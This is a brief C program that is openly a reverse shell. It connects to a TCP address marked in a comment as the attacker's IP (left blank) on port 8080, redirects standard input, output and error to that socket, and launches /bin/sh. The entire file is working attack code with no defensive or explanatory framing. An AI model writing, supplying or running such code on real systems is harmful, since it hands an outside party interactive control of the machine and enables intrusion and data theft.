#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define PORT 8080 //port of http-proxy
#define HOST "" //Attackers IP


int main(){
    int sock;
    struct sockaddr_in sock_addr;


    //create socket
    sock = socket(AF_INET,SOCK_STREAM,0);
    if (sock < 0){
        printf("failed to create socket\n");
        return EXIT_FAILURE;
    }
    printf("created socket\n");

    //info
    sock_addr.sin_port = htons(PORT);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = inet_addr(HOST);

    //declaring a connection
    int connection = connect(sock,(struct sockaddr *)&sock_addr,sizeof(sock_addr));
    if (connection == -1){
        printf("connection failed\n");
        return EXIT_FAILURE;
    }
    printf("connection declared\n");

    dup2(sock,0);
    dup2(sock,1);
    dup2(sock,2);
    char * const wow[] = {"/bin/sh", NULL};
	execve("/bin/sh", wow, NULL);

    return EXIT_SUCCESS;

}
